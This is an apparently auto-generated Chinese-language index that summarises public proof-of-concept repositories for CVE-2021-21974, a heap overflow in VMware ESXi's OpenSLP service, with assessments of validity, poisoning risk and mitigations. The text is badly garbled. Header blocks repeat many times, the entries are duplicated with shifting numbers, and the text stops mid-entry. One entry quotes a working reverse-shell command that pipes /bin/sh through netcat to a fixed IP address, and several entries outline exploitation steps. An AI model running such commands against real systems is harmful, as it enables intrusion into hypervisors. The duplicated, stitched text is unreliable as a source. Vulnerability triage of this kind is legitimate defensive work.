# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md](../2021/CVE-2021-21974-CYBERTHREATANALYSIS_ESXi-Ransomware-Scanner-mi.md)

# CVE-2021-21974

> 📦 该CVE有 **5** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #2

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
